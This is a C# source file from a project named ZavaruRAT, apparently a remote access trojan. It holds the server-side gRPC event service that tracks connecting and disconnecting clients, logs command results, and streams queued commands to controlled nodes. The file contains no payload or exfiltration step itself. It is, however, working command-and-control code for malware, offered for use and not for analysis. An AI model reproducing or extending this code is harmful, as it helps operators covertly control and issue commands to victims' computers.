#region

using Google.Protobuf.WellKnownTypes;
using Grpc.Core;
using Microsoft.AspNetCore.Authorization;
using ZavaruRAT.Main.Runtime;
using ZavaruRAT.Proto;

#endregion

namespace ZavaruRAT.Main.Services;

[Authorize]
public sealed class EventService : EventHub.EventHubBase
{
    private readonly ClientsStorage _storage;
    private readonly ILogger<EventService> _logger;

    public EventService(ClientsStorage storage, ILogger<EventService> logger)
    {
        _storage = storage;
        _logger = logger;
    }

    public override Task<Empty> ClientConnected(ClientConnectedEvent request, ServerCallContext context)
    {
        var nodeId = context.GetNodeId();
        _storage.AddClientFromEvent(nodeId, request);

        _logger.LogInformation("Client {Client} connected", request);

        return Task.FromResult(new Empty());
    }

    public override Task<Empty> ClientDisconnected(ClientDisconnectedEvent request, ServerCallContext context)
    {
        _storage.RemoveClientFromEvent(request);

        _logger.LogInformation("Client {Client} disconnected", request);

        return Task.FromResult(new Empty());
    }

    public override Task<Empty> CommandExecuted(CommandExecutedEvent request, ServerCallContext context)
    {
        _storage.CommandExecuted(request);

        _logger.LogInformation("Result {HashId}: {Result}", request.HashId, request.Success);

        return Task.FromResult(new Empty());
    }

    public override async Task Commands(Empty request, IServerStreamWriter<CommandEvent> responseStream,
                                        ServerCallContext context)
    {
        var nodeId = context.GetNodeId();
        _logger.LogInformation("Node {Node} subscribed to commands updates", nodeId);

        try
        {
            var commands = _storage.GetCommands(nodeId);
            if (commands == null)
            {
                _logger.LogInformation("Unable to get commands for node {Node}", nodeId);
                return;
            }

            await foreach (var command in commands.ToAsyncEnumerable().WithCancellation(context.CancellationToken))
            {
                _logger.LogInformation("Sending command {Command}", command);

                await responseStream.WriteAsync(command);
            }
        }
        catch (TaskCanceledException)
        {
        }

        _logger.LogInformation("Node {Node} unsubscribed from commands updates", nodeId);
    }
}
